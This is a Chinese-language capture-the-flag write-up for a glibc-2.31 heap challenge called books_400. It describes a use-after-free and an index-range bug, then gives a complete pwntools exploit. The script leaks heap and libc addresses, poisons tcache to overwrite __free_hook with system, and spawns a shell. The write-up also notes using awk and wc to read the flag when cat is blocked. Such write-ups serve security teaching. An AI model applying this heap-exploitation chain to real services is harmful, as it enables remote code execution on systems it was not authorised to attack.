# books_400

> 参考：HITCON 2019

题目是 glibc-2.31，IDA 似乎不能很好地反编译，所以就没脱符号表，如果用 Cutter 或者 Ghidra 就看得比较清楚。

原本的想法是 tcache stashing unlink attack，但因为没有限制 Chunk 的上限被非预期了。先讲一下几个点，首先不能用 Fastbins：

```cpp
    if (size <= 0x7F) {
        puts("How can a book be that short???");
        exit(-1);
    }
```

free 的时候给了个 UAF：

```cpp
void sell() {
    int idx;
    printf("This is your 1st/2nd/3rd book? ");
    idx = read_idx();
    if (!bs[idx].content) {
        puts("No way...");
        return;
    }
    free(bs[idx].content);
    // give an uaf
    //bs[idx].size = 0;
    //bs[idx].content = 0;
}
```

因为没限制上限所以可以利用 UAF 来改 tcache 的指针，直接就能改任意地址了，这里放一下 [@XxX（@n132）](https://n132.github.io/)的脚本：

```python
from pwn import *
context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
def cmd(c):
    p.sendlineafter("ice: ",str(c))
def add(idx,size=0x80,c="A",r='n'):
    cmd(1)
    p.sendlineafter("? ",str(idx))
    p.sendlineafter("? ",str(size))
    p.sendafter(": ",c)
    p.sendlineafter("] ",str(r))
def free(idx):
    cmd(2)
    p.sendlineafter("? ",str(idx))
def edit(idx,c):
    cmd(3)
    p.sendlineafter("? ",str(idx))
    p.sendafter(": ",c)
def show(idx):
    cmd(4)
    p.sendlineafter("? ",str(idx))
def magic(c):
    cmd(0xDEADBEEF)
    p.readuntil(".\n")
    p.send(c)
p=remote("10.21.13.112",10004)
#p=process("./books")
p.sendafter("me? ",p64(0xdeadbeef))
add("1",0x233)
add("2",0x233)
free("1")
free("2")
show("2")
p.readuntil("ntent: ")
heap=u64(bytes(p.readline()[:-1]+b'\0\0'))-(0x5555555592d0-0x0000555555559000)
log.warning(hex(heap))
for x in range(4):
    add(1,0x233)
    free(1)
add(1,0x500)
add(2,0x100)
free(1)
show(1)
libc=ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
p.readuntil("ntent: ")
base=u64(bytes(p.readline()[:-1]+b'\0\0'))-(0x00007ffff7fbcbe0-0x7ffff7dd1000)
log.warning(hex(base))
add(2,0x500-0x240)
add(3,0x233)
free(3)
libc.address=base
edit(1,b"A"*(0x500-0x240+8)+p64(0x241)+p64(libc.sym['__free_hook']))
print(pidof(p))
raw_input()
magic(b"A")
magic(p64(libc.sym['system']))
add(1,0x100,"/bin/sh")
free(1)
p.interactive()
#zjgsuctf{4lway5_foll0w1ng_w1th_n3w_t3chs}
```

最后 cat 没给权限，要[用 awk 和 wc 来读 flag](http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/)。

> 后来 [@countfatcode](https://www.cnblogs.com/countfatcode/) 发现还有非预期的地方，写代码的时候 idx 范围没控制好，导致 idx 输入 4 的时候可以直接覆盖 `tps_ptr`，又是另一种做法了：
>
> ```cpp
> int read_idx() {
>    char buf[0x10];
>    int idx;
>    read(0, buf, sizeof(buf));
>    idx = atoi(buf);
>    if (idx < 1 || idx > 4) {
>        puts("No way");
>        exit(-1);
>    }
>    return idx - 1;
> }
> ```
